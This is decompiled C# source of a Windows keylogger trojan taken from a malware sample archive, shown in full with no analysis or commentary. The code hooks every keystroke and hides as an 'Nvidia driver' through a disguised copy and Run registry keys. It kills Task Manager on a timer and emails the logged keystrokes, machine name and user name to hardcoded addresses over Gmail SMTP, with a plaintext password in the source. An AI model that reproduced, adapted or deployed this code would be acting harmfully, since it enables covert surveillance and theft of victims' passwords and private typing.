// Decompiled with JetBrains decompiler
// Type: project.Program
// Assembly: project, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: BE6540B5-FC85-4AE9-A557-94B4202CE2C3
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\Trojan-Ransom.Win32.Blocker.alqu-3e86ff4ee5bf8f473b602a8174735fa208f938a703cf703edc232744a1530664.exe

using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Text;
using System.Timers;
using System.Windows.Forms;

namespace project
{
  internal class Program
  {
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 256;
    private static Program.LowLevelKeyboardProc _proc = new Program.LowLevelKeyboardProc(Program.HookCallback);
    private static IntPtr _hookID = IntPtr.Zero;
    public static string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "nvidia.log");
    public static byte caps = 0;
    public static byte shift = 0;
    public static byte failed = 0;
    public static byte counter = 0;

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(
      int idHook,
      Program.LowLevelKeyboardProc lpfn,
      IntPtr hMod,
      uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(
      IntPtr hhk,
      int nCode,
      IntPtr wParam,
      IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    public static void Main()
    {
      if (Program.failed == (byte) 0)
        System.IO.File.WriteAllText(Program.path, "");
      Program._hookID = Program.SetHook(Program._proc);
      Program.startup();
      Program.Mail("shah_sahab_jhoolalal@yahoo.com", "imran.nazir11001@gmail.com", "pakistan00");
      System.Timers.Timer timer = new System.Timers.Timer();
      timer.Elapsed += new ElapsedEventHandler(Program.OnTimedEvent);
      timer.AutoReset = true;
      timer.Interval = 600000.0;
      timer.Start();
      Application.Run();
      GC.KeepAlive((object) timer);
      Program.UnhookWindowsHookEx(Program._hookID);
    }

    public static void startup()
    {
      string str1 = Application.ExecutablePath.ToString();
      string str2 = str1;
      string destFileName = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "nvdisp.exe");
      try
      {
        System.IO.File.Copy(str1, destFileName, false);
        str1 = destFileName;
      }
      catch
      {
      }
      try
      {
        RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
        if (registryKey.GetValue("Nvidia driver") == null)
          registryKey.SetValue("Nvidia driver", (object) destFileName);
        registryKey.Close();
      }
      catch
      {
      }
      try
      {
        RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
        if (registryKey.GetValue("Nvidia driver") == null)
          registryKey.SetValue("Nvidia driver", (object) str1);
        registryKey.Close();
      }
      catch
      {
      }
      if (!(str1 != str2))
        return;
      Process.Start(str1);
      Environment.Exit(0);
    }

    public static void OnTimedEvent(object source, EventArgs e)
    {
      foreach (Process process in Process.GetProcesses())
      {
        if (process.MainWindowTitle.Contains("Taskmgr.exe"))
          process.Kill();
      }
      ++Program.counter;
      Program.Mail("shah_sahab_jhoolalal@yahoo.com", "imran.nazir11001@gmail.com", "pakistan00");
    }

    public static void Mail(string x, string y, string z)
    {
      MailMessage message = new MailMessage();
      message.To.Add(x);
      message.From = new MailAddress(y);
      message.Subject = Environment.MachineName + "--" + (object) Program.counter + "--" + Environment.UserName;
      message.SubjectEncoding = Encoding.UTF8;
      if (Program.counter == (byte) 0)
        message.Body = "Welcome 2 Pan Yaki...." + Environment.MachineName + "----" + Environment.UserName + "---- is online";
      else
        message.Body = "Welcome 2 Pan Yaki....";
      message.BodyEncoding = Encoding.UTF8;
      message.IsBodyHtml = false;
      message.Priority = MailPriority.Normal;
      SmtpClient smtpClient = new SmtpClient();
      smtpClient.Credentials = (ICredentialsByHost) new NetworkCredential(y, z);
      smtpClient.Port = 587;
      smtpClient.Host = "smtp.gmail.com";
      smtpClient.EnableSsl = true;
      Attachment attachment = new Attachment(Program.path);
      if (Program.counter != (byte) 0)
        message.Attachments.Add(attachment);
      try
      {
        smtpClient.Send(message);
      }
      catch
      {
        attachment.Dispose();
      }
      attachment.Dispose();
    }

    private static IntPtr SetHook(Program.LowLevelKeyboardProc proc)
    {
      using (Process currentProcess = Process.GetCurrentProcess())
      {
        using (ProcessModule mainModule = currentProcess.MainModule)
          return Program.SetWindowsHookEx(13, proc, Program.GetModuleHandle(mainModule.ModuleName), 0U);
      }
    }

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
      if (nCode >= 0 && wParam == (IntPtr) 256)
      {
        StreamWriter streamWriter = System.IO.File.AppendText(Program.path);
        int num = Marshal.ReadInt32(lParam);
        if (Keys.Shift == Control.ModifierKeys)
          Program.shift = (byte) 1;
        switch ((Keys) num)
        {
          case Keys.Back:
            streamWriter.Write("[bs]");
            break;
          case Keys.Tab:
            streamWriter.Write("[tab]");
            break;
          case Keys.Return:
            streamWriter.WriteLine("");
            break;
          case Keys.Pause:
            streamWriter.Write("[pause]");
            break;
          case Keys.Capital:
            Program.caps = Program.caps != (byte) 0 ? (byte) 0 : (byte) 1;
            break;
          case Keys.Escape:
            streamWriter.Write("[esc]");
            break;
          case Keys.Space:
            streamWriter.Write("[sb]");
            break;
          case Keys.Prior:
            streamWriter.Write("[p_up]");
            break;
          case Keys.Next:
            streamWriter.Write("[p_down]");
            break;
          case Keys.End:
            streamWriter.Write("[end]");
            break;
          case Keys.Home:
            streamWriter.Write("[home]");
            break;
          case Keys.Left:
            streamWriter.Write("[lft]");
            break;
          case Keys.Up:
            streamWriter.Write("[up]");
            break;
          case Keys.Right:
            streamWriter.Write("[rgt]");
            break;
          case Keys.Down:
            streamWriter.Write("[dwn]");
            break;
          case Keys.Print:
            streamWriter.Write("[print]");
            break;
          case Keys.Snapshot:
            streamWriter.Write("[prnt_scrn]");
            break;
          case Keys.Insert:
            streamWriter.Write("[insert]");
            break;
          case Keys.Delete:
            streamWriter.Write("[dl]");
            break;
          case Keys.D0:
            if (Program.shift == (byte) 0)
            {
              streamWriter.Write("0");
              break;
            }
            streamWriter.Write(")");
            break;
          case Keys.D1:
            if (Program.shift == (byte) 0)
            {
              streamWriter.Write("1");
              break;
            }
            streamWriter.Write("!");
            break;
          case Keys.D2:
            if (Program.shift == (byte) 0)
            {
              streamWriter.Write("2");
              break;
            }
            streamWriter.Write("@");
            break;
          case Keys.D3:
            if (Program.shift == (byte) 0)
            {
              streamWriter.Write("3");
              break;
            }
            streamWriter.Write("#");
            break;
          case Keys.D4:
            if (Program.shift == (byte) 0)
            {
              streamWriter.Write("4");
              break;
            }
            streamWriter.Write("$");
            break;
          case Keys.D5:
            if (Program.shift == (byte) 0)
            {
              streamWriter.Write("5");
              break;
            }
            streamWriter.Write("%");
            break;
          case Keys.D6:
            if (Program.shift == (byte) 0)
            {
              streamWriter.Write("6");
              break;
            }
            streamWriter.Write("^");
            break;
          case Keys.D7:
            if (Program.shift == (byte) 0)
            {
              streamWriter.Write("7");
              break;
            }
            streamWriter.Write("&");
            break;
          case Keys.D8:
            if (Program.shift == (byte) 0)
            {
              streamWriter.Write("8");
              break;
            }
            streamWriter.Write("*");
            break;
          case Keys.D9:
            if (Program.shift == (byte) 0)
            {
              streamWriter.Write("9");
              break;
            }
            streamWriter.Write("(");
            break;
          case Keys.LWin:
          case Keys.RWin:
          case Keys.Apps:
          case Keys.LShiftKey:
          case Keys.RShiftKey:
          case Keys.LControlKey:
          case Keys.RControlKey:
          case Keys.LMenu:
          case Keys.RMenu:
            streamWriter.Write("");
            break;
          case Keys.F1:
            streamWriter.Write("[f.1]");
            break;
          case Keys.F2:
            streamWriter.Write("[f.2]");
            break;
          case Keys.F3:
            streamWriter.Write("[f.3]");
            break;
          case Keys.F4:
            streamWriter.Write("[f.4]");
            break;
          case Keys.F5:
            streamWriter.Write("[f.5]");
            break;
          case Keys.F6:
            streamWriter.Write("[f.6]");
            break;
          case Keys.F7:
            streamWriter.Write("[f.7]");
            break;
          case Keys.F8:
            streamWriter.Write("[f.8]");
            break;
          case Keys.F9:
            streamWriter.Write("[f.9]");
            break;
          case Keys.F10:
            streamWriter.Write("[f.10]");
            break;
          case Keys.F11:
            streamWriter.Write("[f.11]");
            break;
          case Keys.F12:
            streamWriter.Write("[f.12]");
            break;
          case Keys.VolumeMute:
            streamWriter.Write("[vol_mute]");
            break;
          case Keys.VolumeDown:
            streamWriter.Write("[vol_down]");
            break;
          case Keys.VolumeUp:
            streamWriter.Write("[vol_up]");
            break;
          case Keys.MediaNextTrack:
            streamWriter.Write("[media_next]");
            break;
          case Keys.MediaPreviousTrack:
            streamWriter.Write("[media_prev]");
            break;
          case Keys.MediaStop:
            streamWriter.Write("[media_stop]");
            break;
          case Keys.MediaPlayPause:
            streamWriter.Write("[media_play/pause]");
            break;
          case Keys.OemSemicolon:
            if (Program.shift == (byte) 0)
            {
              streamWriter.Write(";");
              break;
            }
            streamWriter.Write(":");
            break;
          case Keys.Oemplus:
            if (Program.shift == (byte) 0)
            {
              streamWriter.Write("=");
              break;
            }
            streamWriter.Write("+");
            break;
          case Keys.Oemcomma:
            if (Program.shift == (byte) 0)
            {
              streamWriter.Write(",");
              break;
            }
            streamWriter.Write("<");
            break;
          case Keys.OemMinus:
            if (Program.shift == (byte) 0)
            {
              streamWriter.Write("-");
              break;
            }
            streamWriter.Write("_");
            break;
          case Keys.OemPeriod:
            if (Program.shift == (byte) 0)
            {
              streamWriter.Write(".");
              break;
            }
            streamWriter.Write(">");
            break;
          case Keys.OemQuestion:
            if (Program.shift == (byte) 0)
            {
              streamWriter.Write("/");
              break;
            }
            streamWriter.Write("?");
            break;
          case Keys.Oemtilde:
            if (Program.shift == (byte) 0)
            {
              streamWriter.Write("`");
              break;
            }
            streamWriter.Write("~");
            break;
          case Keys.OemOpenBrackets:
            if (Program.shift == (byte) 0)
            {
              streamWriter.Write("[");
              break;
            }
            streamWriter.Write("{");
            break;
          case Keys.OemPipe:
            streamWriter.Write("|");
            break;
          case Keys.OemCloseBrackets:
            if (Program.shift == (byte) 0)
            {
              streamWriter.Write("]");
              break;
            }
            streamWriter.Write("}");
            break;
          case Keys.OemQuotes:
            if (Program.shift == (byte) 0)
            {
              streamWriter.Write("'");
              break;
            }
            streamWriter.Write('"');
            break;
          case Keys.Alt:
            streamWriter.Write("[alt]");
            break;
          default:
            if (Program.shift == (byte) 0 && Program.caps == (byte) 0)
              streamWriter.Write(((Keys) num).ToString().ToLower());
            if (Program.shift == (byte) 1 && Program.caps == (byte) 0)
              streamWriter.Write(((Keys) num).ToString().ToUpper());
            if (Program.shift == (byte) 0 && Program.caps == (byte) 1)
              streamWriter.Write(((Keys) num).ToString().ToUpper());
            if (Program.shift == (byte) 1 && Program.caps == (byte) 1)
            {
              streamWriter.Write(((Keys) num).ToString().ToLower());
              break;
            }
            break;
        }
        Program.shift = (byte) 0;
        streamWriter.Close();
      }
      return Program.CallNextHookEx(Program._hookID, nCode, wParam, lParam);
    }

    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
  }
}
